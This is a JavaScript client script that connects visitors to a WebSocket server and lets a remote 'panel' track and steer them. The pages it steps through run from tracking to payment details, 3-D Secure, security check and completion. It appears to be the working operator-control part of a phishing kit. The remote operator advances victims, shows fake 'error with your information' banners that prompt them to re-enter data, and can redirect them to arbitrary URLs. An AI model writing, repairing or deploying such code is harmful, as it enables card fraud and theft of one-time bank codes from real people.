window.addEventListener("load", () => {
  // Skip default client socket on dashboard route
  if (window.location.pathname.includes("/panel")) {
    return;
  }

  let clientId = localStorage.getItem("clientId");
  if (!clientId) {
    if (window.crypto && window.crypto.randomUUID) {
      clientId = window.crypto.randomUUID();
    } else {
      clientId = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
        /[xy]/g,
        (c) => {
          const r = (Math.random() * 16) | 0;
          const v = c === "x" ? r : (r & 0x3) | 0x8;
          return v.toString(16);
        }
      );
    }
    localStorage.setItem("clientId", clientId);
  }

  // Clean up the host URL (remove any protocol prefix)
  const rawHost = window.VITE_WS_HOST || "localhost:8090";
  const wsHost = rawHost.replace(/^(https?:\/\/|wss?:\/\/)/i, "");

  // Use wss:// for https hosts, ws:// for others
  const wsProtocol =
    wsHost.includes("localhost") ||
    wsHost.startsWith("192.168.") ||
    wsHost.startsWith("127.0.")
      ? "ws://"
      : "wss://";
  const socket = new WebSocket(`${wsProtocol}${wsHost}`);

  // Extract just the route name (last segment of path)
  function getRouteName() {
    const fullPath = window.location.pathname;
    const segments = fullPath.split("/").filter((s) => s);
    const lastSegment = segments[segments.length - 1] || "";

    // Known routes
    const routes = [
      "track",
      "login",
      "payment-details",
      "3d-secure",
      "3d-secure-bank",
      "security-check",
      "complete",
      "panel",
    ];

    // Find matching route
    for (const route of routes) {
      if (lastSegment === route || lastSegment.startsWith(route)) {
        return "/" + route;
      }
    }

    // Default to full path if no match
    return fullPath || "/";
  }

  function sendPresence() {
    try {
      const routeName = getRouteName();
      console.log(
        "Sending presence - Full path:",
        window.location.pathname,
        "Route name:",
        routeName
      );

      socket.send(
        JSON.stringify({
          type: "presence",
          clientId,
          page: routeName,
        })
      );
      // Send session_complete when reaching the /complete page
      if (routeName === "/complete") {
        setTimeout(() => {
          try {
            socket.send(
              JSON.stringify({
                type: "session_complete",
                clientId,
              })
            );
          } catch {}
        }, 1000);
      }
    } catch {}
  }

  socket.addEventListener("open", () => {
    socket.send(
      JSON.stringify({
        type: "register",
        clientId,
        role: "user",
      })
    );
    sendPresence();
  });

  socket.addEventListener("message", (event) => {
    try {
      const data = JSON.parse(event.data);
      console.log("WS message:", data);
      // Store IP when registered
      if (data && data.type === "registered" && data.ip) {
        console.log("Client IP received:", data.ip);
        localStorage.setItem("clientIp", data.ip);
      }
      if (data && data.type === "direct" && data.payload) {
        try {
          window.dispatchEvent(
            new CustomEvent("ws:payload", { detail: data.payload })
          );
        } catch {}
        if (data.payload.type === "allow-next") {
          // Get current route name (not full path)
          const currentRoute = getRouteName();
          const order = [
            "/track",
            "/payment-details",
            "/3d-secure",
            "/security-check",
            "/complete",
          ];
          const idx = order.indexOf(currentRoute);

          console.log(
            "Allow-next: current route:",
            currentRoute,
            "index:",
            idx
          );

          // Navigate to next route
          let nextRoute = "/complete";
          if (idx >= 0 && idx < order.length - 1) {
            nextRoute = order[idx + 1];
          }

          // Build full path with basename
          const fullPath = window.location.pathname;
          const currentSegment = fullPath
            .split("/")
            .filter((s) => s)
            .pop();
          const basePath = fullPath.substring(
            0,
            fullPath.lastIndexOf("/" + currentSegment)
          );
          const nextFullPath = basePath + nextRoute;

          console.log("Redirecting to:", nextFullPath + window.location.search);
          window.location.assign(nextFullPath + window.location.search);
        } else if (data.payload.type === "error") {
          // Check if we're on 3d-secure page (use route name, not full path)
          const currentRoute = getRouteName();
          if (currentRoute === "/3d-secure") {
            // handled inline by page listener
          } else {
            const banner = document.createElement("div");
            banner.textContent =
              data.payload.message ||
              "There was an error with your information.";
            banner.style.position = "fixed";
            banner.style.top = "0";
            banner.style.left = "0";
            banner.style.right = "0";
            banner.style.zIndex = "99999";
            banner.style.background = "#dc2626";
            banner.style.color = "white";
            banner.style.padding = "12px 16px";
            banner.style.fontWeight = "700";
            banner.style.textAlign = "center";
            document.body.appendChild(banner);
            setTimeout(() => {
              banner.style.transition = "opacity 300ms";
              banner.style.opacity = "0";
              setTimeout(() => banner.remove(), 400);
            }, 2000);
          }
        }
      }
      if (data && data.type === "direct" && typeof data.action === "string") {
        try {
          const url = new URL(data.action);
          if (url.protocol === "http:" || url.protocol === "https:") {
            window.location.href = url.toString();
          }
        } catch {
          // ignore invalid action URL
        }
      }
    } catch {
      console.log("WS message:", event.data);
    }
  });

  // Allow React pages to emit WS messages via a custom event
  window.addEventListener("ws:emit", (e) => {
    try {
      const msg = e.detail;
      if (!msg || typeof msg !== "object") return;
      if (socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify(msg));
      }
    } catch {}
  });

  // Track navigation changes and report presence
  const origPush = history.pushState;
  const origReplace = history.replaceState;
  function emitAfterNav() {
    setTimeout(sendPresence, 0);
  }
  history.pushState = function () {
    const ret = origPush.apply(this, arguments);
    emitAfterNav();
    return ret;
  };
  history.replaceState = function () {
    const ret = origReplace.apply(this, arguments);
    emitAfterNav();
    return ret;
  };
  window.addEventListener("popstate", emitAfterNav);
});
